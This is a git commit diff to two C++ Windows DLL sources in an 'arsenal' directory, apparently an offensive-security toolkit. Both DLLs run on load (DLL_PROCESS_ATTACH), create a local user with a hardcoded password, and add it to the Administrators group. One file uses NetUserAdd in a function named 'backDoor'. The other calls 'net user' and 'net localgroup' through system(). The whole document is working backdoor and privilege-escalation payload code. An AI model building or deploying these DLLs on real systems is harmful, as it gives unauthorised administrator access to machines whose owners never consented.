3493e105ce40e17b89fe0bfa1485c715c8ea0200
ferreirasc <leoferreirafx@gmail.com>
2024-07-04 18:44:26 -0400

    fixing dlls to add a new user

--- arsenal/add_user_dll.cpp
+++ arsenal/add_user_dll.cpp
@@ -1,56 +1,61 @@
 #include "pch.h"
+#include <iostream>
+#include <windows.h>
 #include <LM.h>
-#pragma comment(lib, "netapi32.lib")
+#pragma comment(lib, "Netapi32.lib")
+using namespace std;
+wstring name = L"calian";
+LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
+wstring password = L"localadmin123!";
+LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
+DWORD adduserStatus;
+USER_INFO_1 userinfo;
 
-void foo()
+int backDoor(USER_INFO_1 userinfo)
 {
-	wchar_t username[] = L"isec";
-	wchar_t password[] = L"Passw0rd!";
+	userinfo.usri1_name = lpName;
+	userinfo.usri1_password = lpPassword;
+	userinfo.usri1_password_age = 0;
+	userinfo.usri1_priv = USER_PRIV_USER;
+	userinfo.usri1_home_dir = NULL;
+	userinfo.usri1_comment = NULL;
+	userinfo.usri1_flags = UF_NORMAL_ACCOUNT;
+	userinfo.usri1_script_path = NULL;
+	_LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
+	localgroupinfo.lgrmi3_domainandname = lpName;
+	DWORD errorInStruct;
+	adduserStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
+	if (adduserStatus)
+	{
+		return adduserStatus;
+	}
+	adduserStatus = NetLocalGroupAddMembers(NULL, ((wstring)L"Administrators").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
+	if (adduserStatus)
+	{
+		return adduserStatus;
+	}
 
-	// Dynamically look up local administrators group name
+	return 0;
+};
 
-	//Create a SID with value "26", which is the builtin Administrators (https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-well_known_sid_type)
-	BYTE builtinAdministratorsSid[SECURITY_MAX_SID_SIZE];
-	DWORD cbSize = sizeof(builtinAdministratorsSid);
-	CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, &builtinAdministratorsSid,
-		&cbSize);
-
-	// Get the group name associated to this SID
-	SID_NAME_USE sidNameUse;
-	WCHAR name[128], referencedDomainName[128];
-	DWORD cchName = 128, cchReferencedDomainName = 128;
-	BOOL bres = LookupAccountSidW(NULL, builtinAdministratorsSid, name, &cchName, referencedDomainName, &cchReferencedDomainName, &sidNameUse);
-
-	// Create new user
-	USER_INFO_1 user;
-	memset(&user, 0, sizeof(USER_INFO_1));
-	user.usri1_name = username;
-	user.usri1_password = password;
-	user.usri1_priv = USER_PRIV_USER;
-	user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
-	NetUserAdd(NULL, 1, (LPBYTE)&user, NULL);
-
-	// Add the user to the administrators group
-	LOCALGROUP_MEMBERS_INFO_3 members;
-	members.lgrmi3_domainandname = username;
-	NetLocalGroupAddMembers(NULL, name, 3, (LPBYTE)&members, 1);
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		adduserStatus = backDoor(userinfo);
+		break;
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
 }
 
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
+//Debugging... :)
+/*extern "C" __declspec(dllexport) void mydllmain()
 {
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-    case DLL_THREAD_ATTACH: {
-        foo();
-        break;
-    }
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return FALSE;
-}
+	MessageBox(0, L"pupupupupupupupu!", 0, 0);
+}*/
+// Debug: rundll32 .\adduser.dll,mydllmain
--- arsenal/add_user_dll2.cpp
+++ arsenal/add_user_dll2.cpp
@@ -1,18 +1,17 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include <stdlib.h>
 
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
 {
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
         int i;
-        i = system("net user isec <password> /y /add");
-        i = system("net localgroup administrators isec /add");
+        i = system("net user isecurity localadmin123! /y /add 2>C:\\error1.txt");
+        i = system("net localgroup administrators isecurity /add 2>C:\\error2.txt");
         break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
@@ -25,6 +24,6 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 //Debugging... :)
 /*extern "C" __declspec(dllexport) void mydllmain()
 {
-    MessageBox(0, L"pupupupupupupupu!", 0, 0);
+	MessageBox(0, L"pupupupupupupupu!", 0, 0);
 }*/
-// Debug: rundll32 .\add_user_dll.dll,mydllmain
+// Debug: rundll32 .\adduser.dll,mydllmain
